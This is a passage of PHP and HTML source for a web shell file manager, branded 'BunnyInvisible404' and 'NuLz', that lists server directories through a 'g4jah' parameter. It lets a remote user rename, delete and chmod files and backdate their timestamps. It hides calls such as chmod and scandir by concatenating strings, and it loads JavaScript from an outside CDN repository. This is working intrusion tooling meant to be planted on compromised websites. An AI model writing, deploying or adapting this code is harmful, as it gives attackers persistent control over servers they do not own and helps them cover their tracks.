                    alert("Rename Failed")
                </script>';
      }
    }
    //end rename
    //change date
    if (isset($_POST['action']) && $_POST['action'] === 'changedate' && isset($_POST['itemName']) && isset($_POST['oldDate']) && isset($_POST['newDate'])) {
      $itemName = $_POST['itemName'];
      $oldDate = $_POST['oldDate'];
      $newDate = $_POST['newDate'];
      $item = $lokasi . '/' . $itemName;
      if ($str_time($newDate) !== false) {
        if ($tch($itemName, $str_time($newDate))) {
          echo '<script>
                        alert("Success Change Date")
                    </script>';
        } else {
          echo '<script>
                        alert("Failed Change Date")
                    </script>';
        }
      } else {
        echo '<script>
                    alert("Invalid Date Format")
                </script>';
      }
    }
    //end change date
    //permission
    if (isset($_POST['action']) && $_POST['action'] === 'permission' && isset($_POST['itemName']) && isset($_POST['oldPerm']) && isset($_POST['newPerm'])) {
      $itemName = $_POST['itemName'];
      $oldPerm = $_POST['oldPerm'];
      $newPerm = $_POST['newPerm'];
      $item = $lokasi . '/' . $itemName;
      $chperms = 'c' . 'h' . 'm' . 'o' . 'd';
      $oct = 'o' . 'c' . 't' . 'd' . 'e' . 'c';
      $result = $chperms($item, $oct($newPerm));
      //echo $result;
      if ($result) {
        echo '<script>
                    alert("Success Change Permission")
                </script>';
      } else {
        echo '<script>
                    alert("Failed Change Permission")
                </script>';
      }
    }
    //end permission
    //delete dir
    if (isset($_POST['action']) && $_POST['action'] === 'delete' && isset($_POST['folderName'])) {
      $folderName = $_POST['folderName'];
      $folderPath = $lokasi . '/' . $folderName;

      if (deleteDir($folderPath)) {
        echo '<script>
                    alert("Delete Success")
                </script>';
      } else {
        echo '<script>
                    alert("Delete Failed")
                </script>';
      }
    }
    //end delete dir
    //delete file
    if (isset($_POST['action']) && $_POST['action'] === 'delete' && isset($_POST['fileName'])) {
      $fileName = $_POST['fileName'];
      $filePath = $lokasi . '/' . $fileName;

      if (deleteFile($filePath)) {
        echo '<script>
                    alert("Delete Success")
                </script>';
      } else {
        echo '<script>
                    alert("Delete Failed")
                </script>';
      }
    }
    //end delete file
  }
  ?>
  <div class="main coll">
    <div class="table-wrapper">
      <?php
      $scn_d = 'sc' . 'an' . 'd' . 'ir';
      $scan = $scn_d($lokasi);
      ?>
      <table class="responsive-table">
        <thead>
          <tr>
            <th style="text-align: left;">Name</th>
            <th>Size</th>
            <th>Last Modified</th>
            <th>Owner/Group</th>
            <th>Permission</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="text-align: left;" class="body-folder"><a href="?g4jah=<?= dirname($lokasi) ?>"
                style="color: #ffffff; font-weight: 700;"><i class="fa-sharp fa-regular fa-folder-open"
                  style="color: #ffd53b; font-size: calc(2px + 1vw);"></i>..</a></td>
            <td><?= '-' . '-' . 'N' . 'u' . 'L' . 'z' . '-' . '-' ?></td>
            <td><?= '-' . '-' . 'N' . 'u' . 'L' . 'z' . '-' . '-' ?></td>
            <td><?= '-' . '-' . 'N' . 'u' . 'L' . 'z' . '-' . '-' ?></td>
            <td><?= '-' . '-' . 'N' . 'u' . 'L' . 'z' . '-' . '-' ?></td>
            <td><?= '-' . '-' . 'N' . 'u' . 'L' . 'z' . '-' . '-' ?></td>
          </tr>
          <?php
          foreach ($scan as $dir) {
            if (!is_dir("$lokasi/$dir") || $dir == '.' || $dir == '..')
              continue;

            if ($func_exist($psx_usr_uid)) {
              $d_owner = @$psx_usr_uid($own_f("$lokasi/$dir"));
              $d_owner = $d_owner['name'];
            } else {
              $d_owner = $own_f("$lokasi/$dir");
            }
            if ($func_exist($psx_grp_gid)) {
              $d_group = @$psx_grp_gid($grp_f("$lokasi/$dir"));
              $d_group = $d_group['name'];
            } else {
              $d_group = $grp_f("$lokasi/$dir");
            }
            echo '<tr>';
            echo '<td style="text-align: left;"><a href="?g4jah=' . $lokasi . '/' . $dir . '" style="color: #ffffff; font-weight: 700;"><i class="fa-sharp fa-regular fa-folder-open" style="color: #ffbb00; font-size: calc(2px + 1vw);"></i>' . $dir . '</a></td>';
            echo '<td style="color: #64ffda;">' . date('Y-m-d H:i:s', filemtime($lokasi . '/' . $dir)) . '</td>';
            echo '<td style="color: #ffd53b;">--DIR--</td>';
            echo '<td>';
            if ($d_owner == 'root' || $d_owner == 0) {
              echo '<font style="color: #ffffff;">' . $d_owner . '</font>';
            } else {
              echo '<font style="color: #0081c2;">' . $d_owner . '</font>';
            }
            echo '/';
            if ($d_group == 'root' || $d_group == 0) {
              echo '<font style="color: #ffffff;">' . $d_group . '</font>';
            } else {
              echo '<font style="color: #0081c2;">' . $d_group . '</font>';
            }
            echo '</td>';
            echo '<td>';
            if ($is_w("$lokasi/$dir"))
              echo '<font style="color: #00ff00">';
            elseif (!$is_r("$lokasi/$dir"))
              echo '<font style="color: #ff0000">';
            echo NuLzPerms("$lokasi/$dir");

            if ($is_w("$lokasi/$dir") || !$is_r("$lokasi/$dir"))
              echo '</font></td>';
            echo '<td class="aksi">';
            echo '<button type="button" id="aksi" class="rename" data-name="' . $dir . '" value="' . $dir . '"><i class="icon fa-sharp fa-solid fa-pen-field rename-folder-icon"></i></button>';
            echo '<button type="button" id="aksi" class="changedate" data-date="' . date('Y-m-d H:i:s', $f_time($lokasi . '/' . $dir)) . '" data-name="' . $dir . '" value="' . $dir . '"><i class="fa-sharp fa-solid fa-calendar-days"></i></button>';
            echo '<button type="button" id="aksi" class="permission" data-perm="' . ChangePerms($dir) . '" data-name="' . $dir . '" value="' . $dir . '"><i class="fa-duotone fa-solid fa-user"></i></button>';
            echo '<button type="button" id="aksi" class="deleteFolder" data-name="' . $dir . '" value="' . $dir . '"><i class="icon fa-solid fa-trash-can-slash delete-icon"></i></button>';
            echo '</td>';
            echo '</tr>';
          }
          foreach ($scan as $file) {
            $f_size = 'f' . 'il' . 'es' . 'iz' . 'e';
            if (!$is_f("$lokasi/$file"))
              continue;
            $size = $f_size("$lokasi/$file") / 1024;
            $size = $rnd($size, 3);
            if ($size >= 1024) {
              $size = $rnd($size / 1024, 2) . ' MB';
            } else {
              $size = $size . ' KB';
            }

            if ($func_exist($psx_usr_uid)) {
              $f_owner = @$psx_usr_uid($own_f("$lokasi/$file"));
              $f_owner = $f_owner['name'];
            } else {
              $f_owner = $own_f("$lokasi/$file");
            }
            if ($func_exist($psx_grp_gid)) {
              $f_group = @$psx_grp_gid($grp_f("$lokasi/$file"));
              $f_group = $f_group['name'];
            } else {
              $f_group = $grp_f("$lokasi/$file");
            }
            echo '<tr>';
            echo '<td style="text-align: left;"><form action="" method="post"><button type="submit" name="editfile" style="background: none; outline: none; border: none; cursor: pointer; color: #ffffff; font-weight: 500;"><i class="fa-sharp fa-light fa-files" style="color: #eaeaea; font-size: calc(3px + 1vw);"></i>&nbsp;' . $file . '</button><input type="hidden" name="file" value="' . $file . '"></form></td>';
            echo '<td style="color: #64ffda;">' . date('Y-m-d H:i:s', filemtime($lokasi . '/' . $file)) . '</td>';
            echo '<td style="color: #ffd53b;">' . $size . '</td>';
            echo '<td>';
            if ($f_owner == 'root' || $f_owner == 0) {
              echo '<font style="color: #ffffff;">' . $f_owner . '</font>';
            } else {
              echo '<font style="color: #0081c2;">' . $f_owner . '</font>';
            }
            echo '/';
            if ($f_group == 'root' || $f_group == 0) {
              echo '<font style="color: #ffffff;">' . $f_group . '</font>';
            } else {
              echo '<font style="color: #0081c2;">' . $f_group . '</font>';
            }
            echo '</td>';
            echo '<td>';
            if ($is_w("$lokasi/$file"))
              echo '<font style="color: #00ff00">';
            elseif (!$is_r("$lokasi/$file"))
              echo '<font style="color: #ff0000">';
            echo NuLzPerms("$lokasi/$file");

            if ($is_w("$lokasi/$file") || !$is_r("$lokasi/$file"))
              echo '</font></td>';
            echo '<td class="aksi">';
            echo '<button type="button" id="aksi" class="rename" data-name="' . $file . '" value="' . $file . '"><i class="icon fa-sharp fa-solid fa-pen-field rename-file-icon"></i></button>';
            echo '<form action="" method="post" ><button type="submit" name="editfile" id="aksi"><i class="icon fa-regular fa-file-pen edit-file-icon"></i></button><input type="hidden" name="file" value="' . $file . '"></form>';
            echo '<button type="button" id="aksi" class="changedate" data-date="' . date('Y-m-d H:i:s', $f_time($lokasi . '/' . $file)) . '" data-name="' . $file . '" value="' . $file . '"><i class="fa-sharp fa-solid fa-calendar-days"></i></button>';
            echo '<button type="button" id="aksi" class="permission" data-perm="' . ChangePerms($file) . '" data-name="' . $file . '" value="' . $file . '"><i class="fa-duotone fa-solid fa-user"></i></button>';
            echo '<button type="button" id="aksi" class="deleteFile" data-name="' . $file . '" value="' . $file . '"><i class="icon fa-solid fa-trash-can-slash delete-icon"></i></button>';
            echo '</td>';
            echo '</tr>';
          }
          ?>
        </tbody>
      </table>
    </div>
  </div>
  <footer>
    <div class="coll">
      <span><a href="https://t.me/BunnyInvisible404"><strong style="color: #ffd53b">./BunnyInvisible404</strong></a></span>
    </div>
  </footer>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/js/mainv2.js"></script>
</body>

</html>